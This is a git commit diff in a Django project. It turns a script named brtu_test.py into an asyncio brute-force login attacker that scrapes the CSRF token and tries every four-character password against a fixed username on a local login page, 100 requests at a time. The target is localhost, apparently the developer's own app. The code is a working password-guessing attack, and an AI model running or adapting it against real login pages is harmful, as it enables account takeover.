5af3c1fbd3cafc4870eb855da9e382ce3e205744
Teodors Chaly <iteo.chaly@gmail.com>
2024-04-13 22:55:24 +0300

    Asyncio brut force upgrade

--- DailyMate_project/dailybook/brtu_test.py
+++ DailyMate_project/dailybook/brtu_test.py
@@ -1,36 +1,41 @@
-import requests
+import asyncio
+import aiohttp
 from bs4 import BeautifulSoup
-
+import requests
 
 def extract_csrf_token(html_content):
     soup = BeautifulSoup(html_content, 'html.parser')
     csrf_token = soup.find('input', {'name': 'csrfmiddlewaretoken'})['value']
     return csrf_token
 
+async def brute_force_password(session, payload):
+    async with session.post("http://127.0.0.1:8000/accounts/login/", data=payload) as response:
+        if response.status == 200 and response.url == 'http://127.0.0.1:8000/accounts/profile/':
+            print(f"Password {payload['password']} is correct")
+            return True
+        else:
+            print(f"Password {payload['password']} is incorrect")
+            return False
 
-def brute_force_login(username, printable):
-    for i1 in printable:
-        for i2 in printable:
-            for i3 in printable:
-                for i4 in printable:
-                    password = i1 + i2 + i3 + i4
-
-                    payload = {"username": username, "password": password, "csrfmiddlewaretoken": csrf_token}
-                    # if i4 == "8": #
-                    #     payload = {"username": username, "password": "ZXCV!@#$", "csrfmiddlewaretoken": csrf_token}
-
-                    response = requests.post("http://127.0.0.1:8000/accounts/login/", data=payload, cookies=cookies)
-
-                    if response.text.count("Please enter a correct username and password") >= 1:
-                        print(f"Password {password} is incorrect")
-                    else:
-                        print(f"Password {password} is correct")
-                        return
-
+async def brute_force_login(username, printable, num_tasks=100):
+    async with aiohttp.ClientSession() as session:
+        tasks = []
+        for i1 in printable:
+            for i2 in printable:
+                for i3 in printable:
+                    for i4 in printable:
+                        password = i1 + i2 + i3 + i4
+                        payload = {"username": username, "password": password, "csrfmiddlewaretoken": csrf_token}
+                        tasks.append(brute_force_password(session, payload))
+                        if len(tasks) >= num_tasks:
+                            await asyncio.gather(*tasks)
+                            tasks = []
+        if tasks:
+            await asyncio.gather(*tasks)
 
 printable = r"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!'#$%&'()*+,-./:;<=>?@[\]^_`{|}~" + r'"'
+
 login_page = requests.get("http://127.0.0.1:8000/accounts/login/")
 csrf_token = extract_csrf_token(login_page.content)
-cookies = login_page.cookies
 
-brute_force_login("Heyman", printable)
+asyncio.run(brute_force_login("Heyman", printable))
